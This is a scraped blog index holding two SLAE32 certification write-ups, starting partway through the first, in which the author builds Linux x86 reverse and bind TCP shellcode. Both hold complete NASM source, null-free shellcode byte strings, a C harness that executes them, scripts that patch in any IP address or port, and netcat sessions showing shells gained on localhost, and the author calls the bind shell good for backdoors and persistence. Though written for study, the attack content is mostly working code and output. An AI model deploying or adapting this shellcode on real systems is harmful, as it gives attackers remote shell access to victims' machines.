Student Name : Eduardo Silva ; Assignment 2 : TCP Reverse Shell (Linux/x86) Assembly ; File Name : reverse_shell.nasm global\t_start section\t.text _start: global\t_start section\t.text _start: xor eax, eax xor ebx, ebx xor ecx, ecx cdq ; zeroes edx ; socket syscall mov ax, 0x167 mov bl, 0x02 mov cl, 0x01 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; connect syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax ; sockaddr struct push edx\t; ; pushing our 8 bytes of zero push 0x0201017f ; 127.1.1.2 --\u0026gt; 0x7F010102, little-endian = 0x0201017F push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 ; sizeof struct mov ax, 0x16a int 0x80 ; dup2 xor ecx, ecx mov cl, 0x03 dup2: xor eax, eax mov al, 0x3f ;mov ebx, edi dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve xor eax, eax cdq push eax push 0x68732f2f ; \u0026#34;hs//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp mov al, 0xb int 0x80\tCompiling and Testing the Shellcode Checking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 78 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x02\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ Let\u0026rsquo;s use nc to create a listener on port 9001 and then execute rev_shell to connect it.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./rev_shell Shellcode Length: 78 ──────────────────────────────────────────────────── ╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -lvnp 9001 listening on [any] 9001 ... connect to [127.1.1.2] from (UNKNOWN) [127.0.0.1] 35190 id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) rev_shell executes with no errors and it connects back to our listener!\nWhat if we want to change the IP address and the port? One of the requirements for this assigment, is the ability to change easily the IP address and port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.\nThe following shell script named revShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/2-Shell_Reverse_TCP/revShell.sh\nIt accepts two arguments - the desired IP address and port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./revShell.sh Usage: ./revShell.sh \u0026lt;ip address\u0026gt; \u0026lt;port (decimal)\u0026gt; ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./revShell.sh 127.1.1.3 9999 [*] Doing magic with your IP address and port number [*] Done Enjoy this Reverse TCP Shellcode with the IP 127.1.1.3 and port 9999 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x68\\x7f\\x01\\x01\\x03\\x66\\x68\\x27\\x0F\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x6a\\x01\\xcd\\x80\\x31\\xc9\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\xfe\\xc9\\xcd\\x80\\x75\\xf6\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o rev_shell9999 shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/2-Shell_Reverse_TCP ‹main●› ╰─$ ./rev_shell9999 Shellcode Length: 78 ──────────────────────────────────────────────────── ╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -lvnp 9999 listening on [any] 9999 ... connect to [127.1.1.3] from (UNKNOWN) [127.0.0.1] 33880 id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) ls revShell.sh rev_shell rev_shell9999 reverse reverse.c reverse_shell reverse_shell.nasm reverse_shell.o shellcode.c syscalls testIP.sh We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_2/","summary":"This post introduces the second mission to my SLAE32 journey.\nI spent a lot of time researching how to set up sockets or syscalls and taking notes which helped a lot to do this assigment. I won\u0026rsquo;t be as much detailed this time but guess what?\nThe best part is that we can reuse the majority of the bind shellcode to create a reverse shellcode!\nIntroduction The second assignment for the SLAE32 is similar to the previous post one but in this case we need to develop a reverse TCP shellcode.","title":"SLAE32 Assignment 2 - TCP Reverse Shellcode"},{"content":" This post introduces the first mission to my SLAE-32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user. Bind TCP shell? What is this? Generally, a bind TCP shell or bind shell is created when a listening port is configured to redirect the input, output, and errors of an executable (mostly /bin/sh or /bin/bash) to an incoming connection.\nIn practical terms, any machine connecting to this port will be presented with a shell prompt on the target computer and can interact with it.\n(put image)\nA TCP bind shell is a common technique to create backdoors and persistence in a target machine.\nBasics First Before putting our hands-on on developing the shellcode, we should be familiar with the fundamental principles of how to create a proper bind shell. This way, we will better understand how the internals work and where to debug if an error occurs.\nMy approach was to analyze TCP bind shell implementation in a higher-level language, such as C.\nC Prototype Beforehand, analyzing the following code gives an idea of the structure and what syscalls need to be used.\n// from https://infosecwriteups.com/expdev-bind-tcp-shellcode-cebb5657a997 #include \u0026lt;sys/socket.h\u0026gt; #include \u0026lt;sys/types.h\u0026gt; #include \u0026lt;netinet/in.h\u0026gt; #include \u0026lt;stdlib.h\u0026gt; #include \u0026lt;unistd.h\u0026gt; int main() { int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; // 1) Socket Creation (sys_socket 1) sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall (sys_bind 2) bind(sockfd, (struct sockaddr *) \u0026amp;addr, sizeof(addr)); // 3) Listen() Syscall (sys_listen 4) listen(sockfd, 0); // 4) Accept() Syscall (sys_accept 5) acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr // 6) Execve() Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); return 0; } Testing the code to see how it behaves.\nCompiling with gcc\n$ gcc bind.c -o bind\nExecuting bind and using nc to perform a connection to port 9001 in localhost\nThe C bind shell works as expected. From this we have a reference to build our shellcode.\nChecking which syscalls are used In total there are 6 syscalls enumerated below:\nsocket - 359 - 0x167 bind - 361 - 0x169 listen - 363 - 0x16b accept4 - 364 - 0x16c dup2 - 63 - 0x3f execve - 11 - 0xb We can use the file /usr/include/x86_64-linux-gnu/asm/unistd_32 to check the definiton of each syscall.\nLet\u0026rsquo;s dive into each syscall and analyse why they are used and how we can define them in intel x86 ISA.\n1 - Socket syscall (0x167) // 1) Socket Creation sockfd = socket(AF_INET, SOCK_STREAM, 0); The socket syscall has 3 parameters\ndomain - The domain argument specifies a communication domain; this selects the protocol family which will be used for communication.\nIn this case, we are interested in the AF_INET flag which purpose is for IPv4 communication.\nSearching on the internet for where Socket is defined in the Linux environment, I found this Stackoverflow question.\nAfter checking each one, the file /usr/include/x86_64-linux-gnu/bits/socket.h has the value we are looking for\nWe can use the find command this purpose too.\nThe domain value (PF_INET) = 2\nType - specifies the communication semantics\nThe type is SOCK_STREAM = 1\nprotocol - The protocol specifies a particular protocol to be used with the socket.\nAccording to the man page page \u0026ldquo;Normally only a single protocol exists to support a particular socket type within a given protocol family, in which case protocol can be specified as 0\u0026rdquo;\nSo, protocol = 0\nTranslating to assembly:\neax = 0x167 ebx = 0x2 ecx = 0x1 edx = 0 2 - Bind Syscall (0x169) For this syscall the C code has the following structure:\nStruct sockaddr_in // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; Bind Syscall int sockfd, acceptfd; int port = 9001; // Server Address struct struct sockaddr_in addr; addr.sin_family = AF_INET; addr.sin_port = htons(port); addr.sin_addr.s_addr = INADDR_ANY; sockfd = socket(AF_INET, SOCK_STREAM, 0); // 2) Bind() Syscall bind(sockfd, (struct sockaddr *) \u0026amp;addr, sizeof(addr)); With the following arguments:\nint sockfd - sockfd is the socket descriptor returned by socket() in eax. const struct sockaddr *addr - pointer to struct sockaddr that contains information about your IP address and por socklen_t addrlen - addrlen specifies the size, in bytes, of the address structure pointed to by addr. In other words, addrlen is set to sizeof(struct sockaddr). int sockfd\nFirst things first, as we have the socket fil descriptor in eax we can put it directly in ebx, the first argument. \u0026ndash;\u0026gt; mov ebx, eax\nconst struct sockaddr *addr\nAt first sight, defining the sockaddr struct appears to be complex but after some research on how to do it properly turns out to be really simple. We can define the struct using what I call the \u0026ldquo;Struct Stack Technique\u0026rdquo;. An adaption of the execve shellcode stack technique or jmp-call-pop technique.\nWe need to pass a pointer to the address of the struct. Using this technique, ESP will be used to pass the address to ecx.\nLet\u0026rsquo;s start creating our sockaddr to the stack. According to sockets programming tutorial and the C code shown above this struct is defined by the following parameters:\nIn pratical terms:\nAF_INET - 0x2 Port Number - 9001 (0x2329) Internet Address - 0.0.0.0 (all IPv4 address in the local machine) -\u0026gt; meaning we can establish a connection from any interface. Very good for persistence purposes 0 sockeln_t addrlen\nThe value can be obtained from /usr/include/linux/in.h file (#define \\__SOCK_SIZE__ 16).\nTo be more specific the bind syscamll manual page as hints about the size. We know that is the size of the sockaddr struct. The man page as a specification on how this struct is organized.\nFrom there, sa_data is defined as a char array of 14 used to define the protocol address. A char is 1 byte in size, so the array has 14 bytes.\nBut what is sa_family_t type?\nLooking to sockets programming tutorial (page 3), says it is an unsigned short and it refers to the AF_XXX address family. An unsigned short is equal to 2 bytes.\nSearching where this type is defined in the filesystem it appeared this stackoverflow page pointing to this doc related to the sys/socket.h.\nSearching in the filesystem, we confirm sa_family_t is defined as unsigned short type. The doc also specifies it as unsigned int (2 bytes). See the C data types page.\nDoing the math, 2 bytes + 14 bytes = 16 bytes. That\u0026rsquo;s the confirmation for the sockaddr struct size.\n3 - Listen syscall (0x16b) It only requires 2 parameters. The socket field descriptor that we created before and backlog which is the number of connections allowed on the incoming queue. As we want our connection to be immediatily we put the value 0.\n// 3) Listen() Syscall listen(sockfd, 0); 4 - Accept4 syscall (0x16b) Simple syscall with four parameters. Returns a nonnegative integer that is a file descriptor for the accepted socket to eax register.\nThe man page states that addr can be NULL. For consequence addrlen must be NULL too. Also referes If flags is 0, then accept4() is the same as accept().\nJust need to null esi as according to the calling conventions \u0026ndash;\u0026gt; xor esi, esi\nWe already have sockfd and the rest are null. Pretty easy to setup.\n// 4) Accept() Syscall acceptfd = accept(sockfd, NULL, NULL); // 5) Dup2() Syscall 5 - Dup2 syscall (0x3f) Anyone familiar with OS stuff knows the use of the dup family syscalls.\nThis just duplicates stdinput, stdout and stderror to the created TCP connection file descriptor. Doing this it redirects input and output the established connection.\n// 5) Dup2() Syscall dup2(acceptfd, 0); // stdin dup2(acceptfd, 1); // stdout dup2(acceptfd, 2); // stderr 6 - Execve syscall (0xb) At this moment, everything is set up and we just need to tell the program to execute /bin/sh. The execve takes 3 arguments but in this case we just need to fill the first argument to achieve our purposes.\n// 6) Execve() Syscall execve(\u0026#34;/bin/sh\u0026#34;, NULL, NULL); \u0026ldquo;Assembling\u0026rdquo; our shellcode Translating the above concepts to assembly follows the same steps. We just need to be careful to prepare and clean the registers according to each syscall, especially eax.\nAs eax is used to store the return data from a syscall, its content is always written and sometimes we need save eax\u0026rsquo;s content before calling a syscall.\nxor eax, eax ; zeroes eax cdq ; zeroes edx (trick to use less space) After this it\u0026rsquo;s time to set up the syscall arguments havinmg the C code as a reference.\n; socket syscall mov ax, 0x167 ; syscall socket() - 359 push byte 0x02 ; push and pop byte to save space (another trick) pop ebx ; PF_INET value from /usr/include/i386-linux-gnu/bits/socket.h push byte 0x01 pop ecx ; setting up SOCK_STREAM = 1 ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax EAX contains 0x167 which is sys_socket as seen in /usr/include/i386-linux-gnu/asm/unistd_32.h, then EBX is set to 0x2 (PF_INET).\nNext the value 0x01 is moved into ECX which is the value of SOCK_STREAM. EDX is already zero because of the previous cdq instruction.\nJust left to use the interruption syscall int 0x80 to create the socket.\nIf executed successfully, we have our socket. The next step is to setting up the bind syscall.\nBeforehand, let\u0026rsquo;s prepare the next syscall\nmov ebx, eax ; moves socket address to ebx (first arg of bind syscall - sockfd) xor eax, eax Then , the sockaddr_in struct is created as follows:\npush edx\t; edx remains zero ;sockaddr struct\tpush edx\t; edx is still zero -\u0026gt; 0.0.0.0 - bind shell listens in all interfaces push word 0x2923 ; little endian -\u0026gt; 9001 = 0x2329 push word 0x2 ; AF_INET mov ecx, esp ; Putting the struct pointer in ECX The struct is finally defined. The most trickiest part to understand I must say.\nEDX is still zero so pushing zeroes will effectively result into pushing the IP address 0.0.0.0. This address makes the program to lsien in all interfaces. A clever way if our purpose is to have persistence in a target machine.\nThe next step is to load to the stack the port number. As intel works with little-edian format we push 0x2923 which is the value 9001. Lastly, pushing 0x2 refers to AF_INET.\nNow, it is just a matter of putting 0x10 (16 bytes) to EDX which represents the size of sockaddr_in struct as mentioned in the previous section and execute the bind syscall with 0x169 in EAX.\nmov dl, 0x10 mov ax, 0x169 int 0x80 The follwoing syscalls are listen and accept4 which work similarly as the above functions.\nFor the accept4 we already have sockfd in EBX and we just need to clear the other arguments.\nFor dup2 we use a loop to use less instructions to save space while constructing a fully interactive bind shell.\n; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 syscall mov cl, 0x03 dup2: ;xor eax, eax ;mov al, 0x3f push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 We reach the final stage, using execve syscall to execute /bin/sh and spawn a shell when a connection is made to the bind port. If all works as expected a system shell will be provided to the incoming connection which can interact with the target machine.\n; execve cdq\t; edx needs to be zero push ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; /bin//ls push 0x6e69622f mov ebx, esp push byte 0xb ; execve syscall pop eax int 0x80 There is an important step in the above code that we must be aware of, how we place the string /bin/sh in the stack.\npush ecx\t; ecx is zero because jnz and we avoid null bytes push 0x68732f2f ; \u0026#34;sl//\u0026#34; push 0x6e69622f ; \u0026#34;nib/\u0026#34; mov ebx, esp The stack grows from high to low addresses, so we need to place /bin/sh and null terminated in reverse order. Besides that, one of the most important details we know is memory alignment. This highly influences the cpu performance and because of this it will attempt to maximmize the use of memory as efficient as possible.\nThe way it does in a 32-bit ISA is to work with multiples of 4 bytes in the memory address space. So, we need to make our string divisable by 4.\nBut /bin/sh is a 7 byte string, how we make it divisable by 4?\nThere are various ways, but what we can do is \u0026ldquo;abuse\u0026rdquo; the slashes. Using / or // is the same in the Linux environment. Using this knowledge we can use the string /bin//sh to fulfill memory aligment requirements.\nAs an extra challenge I leverage this task to develop a script called the The x86 \u0026quot;Little-Hexdian\u0026quot; String Convert which checks if a string passed as an argument is aligned and converts it to hexadecimal in little-endian format.\nHere\u0026rsquo;s a screenshot of the script output.\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/revHex32.py\nFinal Assembly Code ; Student ID : PA-31319 ; Student Name : Eduardo Silva ; Assignment 1 : TCP Bind Shell (Linux/x86) Assembly ; File Name : bind_shell.nasm global\t_start section\t.text _start: xor eax, eax cdq ; socket syscall mov ax, 0x167 ;xor ebx, ebx ;mov bl, 0x02 push byte 0x02 pop ebx ;xor ecx, ecx ;mov cl, 0x01 push byte 0x01 pop ecx ; edx is already zero int 0x80\t; interruption syscall or interrupt vector. Returns pointer to the socket in eax ; bind syscall mov ebx, eax ; moves socket address to ebx (first arg - sockfd) xor eax, eax push edx\t; edx remains zero ; sockaddr struct\tpush edx\t; 0.0.0.0 push word 0x2923 ;little endian -\u0026gt; 9001 = 0x2329 push word 0x2 mov ecx, esp mov dl, 0x10 mov ax, 0x169 int 0x80 ; listen syscall xor eax, eax xor ecx, ecx ; ebx already has sockfd mov ax, 0x16b ;add ax, 0x2 int 0x80 ; accept4 syscall ; ebx already has sockfd xor eax, eax cdq xor ecx, ecx xor esi, esi mov ax, 0x16c int 0x80 ;xor edi, edi mov edx, eax ; edx is already zero ; dup2 mov cl, 0x03 dup2: push byte 0x3f pop eax mov ebx, edx dec cl int 0x80 jnz dup2\t; decrements ecx and jumps until ecx=0 ; execve cdq\t; edx needs to be zero ;push eax push ecx\t; ecx is zero because jnz push 0x68732f2f push 0x6e69622f mov ebx, esp ;xor eax, eax ;mov al, 0xb push byte 0xb pop eax int 0x80\tCompiling and Testing the Shellcode To be easier to compile my shellcode scripts and get the size and the opcodes, I developed a shell script named assembler.sh\nAvailable in https://github.com/0xnibbles/slae_x86/blob/main/assembler.sh\nChecking assembler.sh output\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ls bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o biShell.sh original_bind_shell.nasm syscalls ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main› ╰─$ ../../assembler.sh bind_shell.nasm [*] Compiling with NASM [*] Linking [*] Extracting opcodes [*] Done Shellcode size: 95 \u0026#34;\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\u0026#34; -------------------- [*] Hack the World! -------------------- No null bytes appear in the shellcode. We are good to go and paste the shellcode to our shellcode.c program\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char code[] = \\ \u0026#34;\\x31\\xc0\\x99\\x66\\xb8\\x67\\x01\\x6a\\x02\\x5b\\x6a\\x01\\x59\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x23\\x29\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x89\\xc2\\xb1\\x03\\x6a\\x3f\\x58\\x89\\xd3\\xfe\\xc9\\xcd\\x80\\x75\\xf5\\x99\\x51\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\x6a\\x0b\\x58\\xcd\\x80\u0026#34;; main() { printf(\u0026#34;Shellcode Length: %d\\n\u0026#34;, strlen(code)); int (*ret)() = (int(*)())code; ret(); } Compiling with gcc and executing it\n$ gcc -fno-stack-protector -m32 -z execstack -o shellcode shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell Shellcode Length: 95 No errors and our bind shell is awaiting for a connection. Let\u0026rsquo;s use nc to perform that.\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9001 (UNKNOWN) [127.0.0.1] 9001 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) Fantastic! The TCP Bind Shell works as expected and was successfully injected into a working program.\nWhat if we want to change the bind port? One of the requirements for this assigment, is the ability to change easily the bind port used in the shellcode. For that, we can change the bytes in shellcode related to the port and changed them for specific port we want the bind shell waits for a connection.\nThe following shell script named biShell.sh replaces the hardcoded 9001 with the port provided by the user as an argument. It automatically converts the port into hexadecimal little-endian format.\nAvailable at https://github.com/0xnibbles/slae_x86/blob/main/assignments/1-Shell_Bind_TCP/biShell.sh\nIt accepts one argument - the desired bind port.\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./biShell.sh 9999 [*] Doing magic with your port number [*] Done Enjoy this Bind TCP Shellcode with the port 9999 \u0026#34;\\x31\\xc0\\x31\\xdb\\x31\\xc9\\x99\\x66\\xb8\\x67\\x01\\xb3\\x02\\xb1\\x01\\xcd\\x80\\x89\\xc3\\x31\\xc0\\x52\\x52\\x66\\x68\\x27\\x0F\\x66\\x6a\\x02\\x89\\xe1\\xb2\\x10\\x66\\xb8\\x69\\x01\\xcd\\x80\\x31\\xc0\\x31\\xc9\\x66\\xb8\\x6b\\x01\\xcd\\x80\\x31\\xc0\\x99\\x31\\xc9\\x31\\xf6\\x66\\xb8\\x6c\\x01\\xcd\\x80\\x31\\xff\\x89\\xc7\\xb1\\x03\\x31\\xc0\\xb0\\x3f\\x89\\xfb\\xfe\\xc9\\xcd\\x80\\x75\\xf4\\x31\\xc0\\x99\\x50\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd\\x80\u0026#34; [*] Port converted in hex Little-Endian: 270F -------------------- [*] Hack the World! -------------------- Compiling using our shellcode tester and executing it\n╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ gcc -fno-stack-protector -m32 -z execstack -o bind_shell9999 shellcode.c shellcode.c:7:1: warning: return type defaults to ‘int’ [-Wimplicit-int] main() { ^~~~ ╭─edu@debian ~/Desktop/slae_x86/assignments/1-Shell_Bind_TCP ‹main●› ╰─$ ./bind_shell9999 Shellcode Length: 101 Trying to establish a connection to port 9999\n╭─edu@debian ~/Documents/blogGithub/dev-blog/0xnibbles ‹master●› ╰─$ nc -nv 127.0.0.1 9999 (UNKNOWN) [127.0.0.1] 9999 (?) open ls biShell.sh bind bind.c bind_shell bind_shell.asm bind_shell.nasm bind_shell.o bind_shell9999 original_bind_shell.nasm shellcode.c syscalls id uid=1000(edu) gid=1000(edu) groups=1000(edu),24(cdrom),25(floppy),27(sudo),29(audio),30(dip),44(video),46(plugdev),109(netdev),111(bluetooth),115(lpadmin),116(scanner) We get a shell!!!\nThis blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification: http://securitytube-training.com/online-courses/securitytube-linux-assembly-expert/\nStudent ID: PA-31319\nAll the source code files are available on GitHub at https://github.com/0xnibbles/slae_x86\n","permalink":"https://0xnibbles.github.io/posts/slae_32_assignment_1/","summary":"This post introduces the first mission to my SLAE-32 journey.\nIntroduction The main goal for the first SLAE32 assignment is to develop a shellcode for bind TCP shell with the following requirements:\nBinds to a port; Executing a shell on incoming connection; The shellcode should be null-free; With the ability for the port to be easily configurable. In other words, the connection port should be easy to set up for the user.","title":"SLAE32 Assignment 1 - TCP Bind Shellcode"}]